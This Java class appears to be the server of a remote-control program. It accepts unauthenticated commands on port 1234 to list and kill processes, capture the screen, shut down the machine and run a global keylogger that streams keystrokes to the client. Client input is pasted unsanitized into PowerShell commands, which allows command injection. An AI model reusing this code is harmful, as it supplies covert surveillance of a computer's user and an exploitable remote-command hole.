package Server;

import org.jnativehook.GlobalScreen;

import java.net.*;
import java.io.*;
import java.awt.Robot;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;

import java.util.Base64;

public class ServerRunner {
    private ServerSocket ss = null;
    private Socket s = null;
    private InputStreamReader in = null;
    private OutputStreamWriter out = null;
    private BufferedReader br = null;
    private BufferedWriter bw = null;
    private Listener listener = null;

    public void runServer() throws IOException {
        ss = new ServerSocket(1234);
        
        while (true) {
            try {
                System.out.println("Waiting for client...");
                s = ss.accept();
                System.out.println("Client accepted");

                in = new InputStreamReader(s.getInputStream());
                out = new OutputStreamWriter(s.getOutputStream());

                br = new BufferedReader(in, 2048);
                bw = new BufferedWriter(out, 2048);

                while (true) {
                    String recv = br.readLine();
                    System.out.println(recv);
                    if (recv.equals("Disconnect")) {
                        new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
                        System.out.println("Client disconnected");
                        break;
                    }
                    else if (recv.equals("List Process"))
                        ListProcess();
                    else if (recv.equals("List App"))
                        ListApp();
                    else if (recv.equals("Screen shot")) {
                        ScreenShot();
                    }
                    else if (recv.equals("Shutdown"))
                        Shutdown();
                    else if (recv.equals("Start Listen"))
                        Listen();
                    else if (recv.equals("Start"))
                        Start();
                    else if (recv.equals("Stop"))
                        Stop();
                    else if (recv.equals("Stop Listen"))
                        StopListen();
                }

                s.close();
            } catch (Exception ex) {
                System.out.println("Something went wrong!");
                s.close();
                ss.close();
                in.close();
                out.close();
                br.close();
                bw.close();
                break;
            }
        }        
    }

    private boolean isNumeric(String str) {
        try {
            Integer.parseInt(str);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void Stop() {
        try {
            String recv = br.readLine();

            String cmd = "";
            if (isNumeric(recv))
                cmd = "powershell \"Stop-Process -ID \""+ recv + "\" -Force\"";
            else
                cmd = "powershell \"Stop-Process -Name \""+ recv + "\" -Force\"";

            Runtime.getRuntime().exec(cmd);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private void Start() {
        try {
            String recv = br.readLine();

            String cmd = "";
            if (!isNumeric(recv))
                cmd = "powershell \"Start-Process "+ recv + "\"";

            Runtime.getRuntime().exec(cmd);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private void ListProcess() {
        try {
            String line;
            Process p = Runtime.getRuntime().exec("powershell \"gps | select ProcessName,Id\"");
            BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
            int i = 0;
            while ((line = input.readLine()) != null) {
                if (i > 2) {
                    if (line.equals(""))  {
                        bw.write("End");
                        bw.newLine();
                        bw.flush();
                        break;
                    }
                    else {
                        bw.write(line);
                        bw.newLine();
                        bw.flush();
                    }
                }
                i++;
            }

            input.close();
        } catch (Exception ex) {
            System.out.println("Unable to get processes");
            ex.printStackTrace();
        }
    }

    private void ListApp() {
        try {
            String line;
            Process p = Runtime.getRuntime().exec("powershell \"gps | where {$_.MainWindowHandle -ne 0 } | select ProcessName,Id\"");
            BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
            int i = 0;
            while ((line = input.readLine()) != null) {
                if (i > 2) {
                    if (line.equals(""))  {
                        bw.write("End");
                        bw.newLine();
                        bw.flush();
                        break;
                    }
                    else {
                        bw.write(line);
                        bw.newLine();
                        bw.flush();
                    }
                }
                i++;
            }

            input.close();
        } catch (Exception ex) {
            System.out.println("Unable to get processes");
        }
    }

    private void ScreenShot() {
        try {
            Robot robot = new Robot();
            Rectangle rec = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenshot = robot.createScreenCapture(rec);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(screenshot, "png", baos);
            byte[] data = baos.toByteArray();

            String imageString = Base64.getEncoder().encodeToString(data);
            int len = 0, data_len = imageString.length();

            bw.write(Integer.toString(data_len));
            bw.newLine();
            bw.flush();

            while (len < data_len) {
                if (len + 2048 > data_len) {
                    bw.write(imageString, len, data_len - len);
                    len += (data_len - len);
                } else {
                    bw.write(imageString, len, 2048);
                    len += 2048;
                }
                bw.newLine();
                bw.flush();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private void Shutdown() {
        try {
            s.close();
            ss.close();
            in.close();
            out.close();
            br.close();
            bw.close();
            Runtime.getRuntime().exec("shutdown /s /t 5");
            System.exit(0);
        } catch (Exception ex) {
            System.out.println("Unable to shutdown");
            ex.printStackTrace();
        }
    }

    private void StopListen() {
        try {
            bw.write("end");
            bw.newLine();
            bw.flush();
        } catch (Exception ex) {
            ex.printStackTrace();
        }

        GlobalScreen.getInstance().removeNativeKeyListener(listener);
        GlobalScreen.unregisterNativeHook();
    }

    private void Listen() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        listener = new Listener(bw);
        GlobalScreen.getInstance().addNativeKeyListener(listener);
    }

    
}
